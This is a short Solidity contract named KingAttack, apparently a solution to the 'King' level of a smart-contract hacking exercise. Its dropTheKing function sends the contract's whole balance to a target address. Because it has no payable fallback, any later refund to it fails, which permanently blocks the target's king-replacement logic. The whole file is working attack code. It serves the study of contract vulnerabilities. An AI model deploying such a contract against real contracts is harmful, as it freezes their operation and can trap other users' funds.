pragma solidity ^0.4.18;

contract KingAttack {
  function KingHack() public payable { }

  function dropTheKing(address _address) public payable {
    address(_address).call.value(this.balance)();
  }
}
